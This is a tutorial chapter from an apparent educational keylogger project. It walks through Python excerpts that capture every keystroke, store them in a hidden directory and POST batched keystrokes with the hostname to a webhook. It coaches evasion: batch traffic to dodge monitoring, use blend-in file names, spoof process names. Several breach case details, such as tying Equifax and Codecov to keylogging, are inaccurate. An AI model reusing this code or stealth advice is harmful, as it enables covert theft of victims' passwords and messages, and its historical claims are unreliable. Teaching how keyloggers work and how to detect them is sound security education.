# Core Security Concepts

This document explains the security concepts you'll encounter while building this project. These aren't just definitions, we'll dig into why they matter and how they actually work.

## Keyboard Event Capture

### What It Is

Operating systems expose keyboard input through event streams that applications can subscribe to. When you press a key, the OS generates an event containing the key code, timestamp, and modifiers (Shift, Ctrl, etc). Applications like text editors use these events to respond to user input. Keyloggers exploit this same mechanism to monitor keystrokes without the user's knowledge.

### Why It Matters

Keyboard capture is the foundation of password theft, the most common attack vector in data breaches. When Equifax was breached in 2017, stolen credentials allowed attackers to access 147 million records. Those credentials often come from keyloggers deployed via phishing emails or drive-by downloads. Unlike network sniffing which requires man-in-the-middle positioning, keyloggers run directly on the victim's machine with full access to plaintext input before encryption.

### How It Works

Modern operating systems provide event APIs at different privilege levels:

```
User Space Applications
         ↓
   Input Event Queue
         ↓
    Kernel Driver
         ↓
   Hardware Controller
```

The pynput library we use (`keylogger.py:43`) hooks into user space event listeners. On Linux it monitors X11 or Wayland events. On macOS it uses the Accessibility API. On Windows it sets up a low-level keyboard hook via SetWindowsHookEx under the hood.

When a key is pressed, the OS delivers it to all registered listeners before the application processes it. This is why keyloggers see passwords even when they're typed into password fields that display asterisks.

In our implementation (`keylogger.py:428-458`):
```python
def _on_press(self, key: Key | KeyCode) -> None:
    """
    Callback for key press events
    """
    if key == self.config.toggle_key:
        self._toggle_logging()
        return

    if not self.is_logging.is_set():
        return

    self._update_active_window()
    key_str, key_type = self._process_key(key)
```

Every keystroke triggers this callback. The function processes the key, determines what application had focus, and logs the event. The OS delivers every single keystroke to our listener, including passwords, credit card numbers, and private messages.

### Common Attacks

1. **Credential Harvesting** - Keyloggers deployed via phishing emails capture login credentials for banking, email, and corporate systems. The 2014 JPMorgan Chase breach started with compromised credentials that gave attackers access to 76 million households.

2. **Man-in-the-Endpoint** - While TLS protects data in transit, keyloggers capture it before encryption happens. A user typing their password into a perfectly secure HTTPS login form is still compromised if a keylogger is running on their machine.

3. **Session Token Theft** - API keys, OAuth tokens, and session cookies often get pasted from password managers. Keyloggers capture these high-value targets. In 2021, the CodeCov supply chain attack used a keylogger-like technique to steal credentials from CI/CD pipelines.

### Defense Strategies

**Virtual Keyboards**: Some banking sites use on-screen keyboards where you click letters instead of typing. This defeats basic keyloggers but is vulnerable to screenshot capture (see 04-CHALLENGES.md for adding this capability).

**Keystroke Encryption**: Tools like KeyScrambler encrypt keystrokes at the kernel level before they reach applications. This requires a kernel driver that intercepts events lower in the stack than user space keyloggers can access.

**Behavioral Detection**: EDR (Endpoint Detection and Response) systems look for suspicious patterns like reading keyboard events from non-GUI applications, accessing processes they shouldn't, or making network connections to known C2 servers. Our webhook delivery (`keylogger.py:326-357`) would trigger alerts in mature EDR systems.

**Hardware Security**: Some enterprises issue hardware security keys (YubiKey, etc) for authentication. Physical key presses can't be captured by software keyloggers since the authentication happens on the device.

## Data Exfiltration Patterns

### What It Is

Data exfiltration is the process of getting stolen data out of a compromised system and into attacker-controlled infrastructure. The challenge isn't just capturing data (that's easy), it's sending it home without getting caught by network monitoring, DLP systems, or suspicious users.

### Why It Matters

In the 2020 SolarWinds breach, attackers spent months inside networks exfiltrating data without detection. They used legitimate-looking DNS queries and HTTPS traffic to blend in. The Verizon DBIR reports that data exfiltration happens in 58% of breaches, but detection often takes months. Fast exfiltration means data gets stolen before anyone notices the breach.

### How It Works

Our keylogger uses webhook delivery over HTTPS (`keylogger.py:326-357`):

```python
def _deliver_batch(self, events: list[KeyEvent]) -> None:
    """
    POST buffered events to the webhook endpoint
    """
    if not events or not self.config.webhook_url:
        return

    payload = {
        "timestamp": datetime.now().isoformat(),
        "host": platform.node(),
        "events": [e.to_dict() for e in events],
    }

    try:
        response = requests.post(
            self.config.webhook_url,
            json=payload,
            timeout=WEBHOOK_TIMEOUT_SECS,
        )
```

This looks like normal application traffic. It uses HTTPS (encrypted), posts to what appears to be a legitimate webhook endpoint, and batches events to reduce network noise. The `webhook_batch_size` parameter (`keylogger.py:116`) controls how many keystrokes accumulate before transmission.

Common exfiltration channels:
- **HTTP/HTTPS POST**: Looks like API traffic, blends with normal web requests
- **DNS tunneling**: Encodes data in DNS queries, bypasses many firewalls
- **Cloud storage**: Uploads to Dropbox/Google Drive using legitimate APIs
- **Email**: Sends logs as email attachments through compromised accounts
- **Steganography**: Hides data in images posted to social media

### Common Pitfalls

**Mistake 1: Sending data too frequently**
```python
# Bad: Sends every single keystroke immediately
def _on_press(self, key):
    requests.post(webhook_url, json={"key": key})
```

This creates massive network traffic and is easily detected. Every keystroke generates an HTTPS request, which network monitoring flags as anomalous.

```python
# Good: Batch events with buffer swap (keylogger.py:308-324)
def add_event(self, event: KeyEvent) -> None:
    if not self.enabled:
        return

    batch: list[KeyEvent] | None = None
    with self.buffer_lock:
        self.event_buffer.append(event)
        if len(self.event_buffer) >= self.config.webhook_batch_size:
            batch = self.event_buffer
            self.event_buffer = []

    if batch:
        self._deliver_batch(batch)
```

Batching reduces network calls by 50x or more. Sending 50 keystrokes in one request looks like a normal form submission.

**Mistake 2: Ignoring failures**
```python
# Bad: Data lost if webhook is down
requests.post(webhook_url, json=payload)
```

If the webhook is unreachable, keystrokes are lost forever. Sophisticated malware persists data locally and retries.

Our implementation logs to disk first (`keylogger.py:248-255`), then sends to webhook. If delivery fails, logs remain on disk for later exfiltration.

## Cross-Platform Malware Development

### What It Is

Malware that runs on multiple operating systems (Windows, macOS, Linux) using platform-specific APIs where necessary but sharing core logic. This maximizes attack surface since victims use different platforms.

### How It Works

Our keylogger detects the platform and loads appropriate modules (`keylogger.py:53-68`):

```python
WINDOWS = "Windows"
DARWIN = "Darwin"
LINUX = "Linux"

if platform.system() == WINDOWS:
    try:
        import win32gui
        import win32process
        import psutil
    except ImportError:
        win32gui = None
elif platform.system() == DARWIN:
    try:
        from AppKit import NSWorkspace
    except ImportError:
        NSWorkspace = None
```

The `subprocess` module is imported unconditionally at module top level (line 27) since it's stdlib. Platform constants (`WINDOWS`, `DARWIN`, `LINUX`) eliminate repeated magic strings.

The WindowTracker class (`keylogger.py:155-219`) implements platform-specific window detection:
- Windows: Uses win32gui to get foreground window handle, then psutil for process info
- macOS: Uses NSWorkspace to query the active application
- Linux: Shells out to xdotool to get window title

Core functionality (keyboard capture, logging) uses cross-platform libraries like pynput. Platform-specific code is isolated in the WindowTracker component.

### Why This Matters

The 2017 NotPetya ransomware attack primarily targeted Windows but its spreading mechanisms worked across Linux servers too. Cross-platform malware increases impact. Attackers targeting corporations need to compromise both employee Windows laptops and Linux/macOS development machines where credentials and source code live.

## Log Management and Rotation

### What It Is

The strategy for storing captured data locally without filling the disk or creating obviously large files that raise suspicion. Log rotation creates new files when size limits are reached.

### How It Works

Our LogManager (`keylogger.py:222-296`) implements automatic rotation using direct file I/O:

```python
def _check_rotation(self) -> None:
    """
    Rotate log file when size limit is reached
    """
    try:
        size = self.current_log_path.stat().st_size
    except FileNotFoundError:
        self._rotate()
        return

    if size / BYTES_PER_MB >= self.config.max_log_size_mb:
        self._rotate()

def _rotate(self) -> None:
    """
    Close current log file and open a new one
    """
    self._file.close()
    self.current_log_path = self._get_new_log_path()
    self._file = open(self.current_log_path, 'a', encoding='utf-8')
```

When a log file reaches the size limit (default 5MB), LogManager closes the file handle and opens a new one with a fresh timestamp (including microseconds for uniqueness). If the log file is deleted externally, `FileNotFoundError` triggers a rotation to recover gracefully.

The default config (`keylogger.py:112`) stores logs in `~/.keylogger_logs`, a hidden directory (leading dot) that won't appear in casual file browsing on Unix systems.

### Common Attacks

Attackers balance stealth against data loss:
- Too small rotation: Creates many files, increases chance of detection
- Too large rotation: Creates huge files that fill the disk or are obviously suspicious
- No rotation: A 500MB keylog file screams "malware"

Production malware often compresses logs before rotation, uses filenames that blend in (.cache_data, .tmp_logs), or stores logs in legitimate application directories.

## Detection Evasion

### What It Is

Techniques to avoid detection by antivirus, EDR systems, network monitoring, and suspicious users. The goal is persistence, staying undetected for months while exfiltrating data.

### How It Works

Our keylogger includes a toggle key (`keylogger.py:460-477`):

```python
def _toggle_logging(self) -> None:
    """
    Toggle logging on/off with the configured key
    """
    toggle = self.config.toggle_key.name.upper()

    if self.is_logging.is_set():
        self.is_logging.clear()
        print(f"\n[*] Logging paused. Press {toggle} to resume.")
    else:
        self.is_logging.set()
        print(f"\n[*] Logging resumed. Press {toggle} to pause.")
```

This allows quick pausing if the victim becomes suspicious. More sophisticated malware uses process hiding, rootkit techniques, or even monitors for forensic tools and shuts down when detected.

Evasion techniques we could add (see 04-CHALLENGES.md):
- **Process name spoofing**: Rename to "svchost.exe" or "system_update"
- **Encryption**: Encrypt logs so disk scans don't find sensitive keywords
- **Timing analysis**: Only transmit during work hours to blend with normal traffic
- **Legitimate API abuse**: Use Windows COM automation or macOS AppleScript which appear as normal system activity

### Common Pitfalls

**Mistake: Using obviously malicious names**
```python
# Bad
config = KeyloggerConfig(log_file_prefix="KEYLOG_STOLEN_PASSWORDS")
```

Any forensic scan finds files named "KEYLOG". Better to use names like "cache_data" or "tmp_sync" that blend in.

## How These Concepts Relate

```
Keyboard Event Capture
         ↓
   (stores locally)
         ↓
    Log Management
         ↓
   (batches events)
         ↓
  Data Exfiltration
         ↓
  (delivers remotely)
         ↓
  Attacker C2 Server
```

Detection evasion applies to every stage. Cross-platform development multiplies the attack surface. Each concept builds on the previous.

## Industry Standards and Frameworks

### OWASP Top 10

This project relates to:
- **A07:2021 - Identification and Authentication Failures** - Keyloggers bypass authentication by stealing credentials before they're even submitted. Multi-factor authentication helps but is still vulnerable if the second factor is SMS-based (SIM swapping) or TOTP codes typed on the keyboard.
- **A08:2021 - Software and Data Integrity Failures** - Keyloggers often arrive via supply chain attacks or compromised software updates. The 2020 SolarWinds breach injected keylogger-like functionality into trusted software.

### MITRE ATT&CK

Relevant techniques:
- **T1056.001** - Input Capture: Keylogging - Exact technique our project demonstrates. MITRE documents real-world usage by APT groups including APT28, APT29, and Carbanak.
- **T1041** - Exfiltration Over C2 Channel - Our webhook delivery mechanism. Attackers use HTTPS to blend with legitimate traffic.
- **T1027** - Obfuscated Files or Information - Would apply if we added encryption to log files (Challenge in 04-CHALLENGES.md).
- **T1082** - System Information Discovery - Our platform detection (`platform.system()`) gathers information about the compromised host.

### CWE

Common weakness enumerations covered:
- **CWE-200** - Exposure of Sensitive Information - Keyloggers expose every secret typed, from passwords to private messages. Our project shows how easily this happens at the application layer.
- **CWE-522** - Insufficiently Protected Credentials - Demonstrates why typing passwords is inherently insecure. Even "secure" password managers are vulnerable when users paste credentials.

## Real World Examples

### Case Study 1: Target Breach (2013)

Attackers compromised Target's payment systems using malware that included keylogging components. The malware, called BlackPOS, captured keystrokes from point-of-sale terminals to steal magnetic stripe data as employees swiped cards.

**What happened**: Over 40 million credit and debit cards were stolen during the 2013 holiday shopping season. The breach cost Target over $200 million in settlements and destroyed customer trust.

**How the attack worked**: BlackPOS included a memory scraper that captured unencrypted card data from RAM, but also logged keyboard input to steal credentials for lateral movement through Target's network.

**What defenses failed**: Target had network segmentation but attackers used stolen credentials (likely captured via keylogging) to move from the HVAC vendor's network into payment systems. Network monitoring detected anomalies but alerts were ignored.

**How this could have been prevented**: Application whitelisting would have blocked unauthorized executables like BlackPOS. Network segmentation should have prevented HVAC vendor access to payment systems. Real-time monitoring of processes reading keyboard events might have detected the keylogger component.

### Case Study 2: Operation Aurora (2010)

Chinese attackers targeted Google, Adobe, and dozens of other companies using sophisticated malware that included keylogging functionality. The operation aimed to steal intellectual property and access Gmail accounts of human rights activists.

**What happened**: Attackers gained access to source code repositories, internal systems, and compromised Gmail accounts. Google went public with the breach, a rare move that exposed the scope of nation-state cyber operations.

**How the attack worked**: Spear phishing emails delivered malware that established persistence and deployed keyloggers to capture credentials. Attackers used these credentials to access version control systems containing source code.

**What defenses failed**: Perimeter defenses (firewalls, antivirus) failed to detect the zero-day exploits used in initial compromise. Credential-based authentication allowed lateral movement once keyloggers captured passwords.

**How this could have been prevented**: Hardware security keys for authentication (Google now mandates these internally) prevent credential theft via keylogging. Zero-trust architecture that validates every request regardless of network position limits the value of stolen credentials.

## Testing Your Understanding

Before moving to the architecture, make sure you can answer:

1. Why do keyloggers see passwords even when they're typed into fields that display asterisks? (Hint: Think about where in the data flow the masking happens versus where keyloggers intercept)

2. What's the security difference between sending keystrokes immediately versus batching them? What trade-offs does an attacker make? (Think detection versus data loss)

3. If you add HTTPS encryption to webhook delivery, does that protect against network monitoring? Why or why not? (Consider what the monitors can actually see)

If these questions feel unclear, re-read the relevant sections. The implementation will make more sense once these fundamentals click.

## Further Reading

**Essential:**
- MITRE ATT&CK T1056.001 - Real-world keylogger usage by APT groups, including indicators of compromise and detection methods
- "The Art of Memory Forensics" by Volatility Foundation - Chapter on detecting malware in RAM, includes keylogger detection techniques

**Deep dives:**
- "Rootkits and Bootkits" by Alex Matrosov - Covers kernel-level keystroke interception and how rootkits hide keyloggers from detection
- CVE-2017-13890 - Accessibility API vulnerability on macOS that keyloggers could exploit for permission bypass

**Historical context:**
- DefCon 18: "Advanced Mac OS X Rootkits" by Dino Dai Zovi - Early work on macOS keyloggers using kernel extensions
- BlackHat USA 2011: "Defending Against Malicious Application Compatibility Shims" - Windows technique for injecting keyloggers
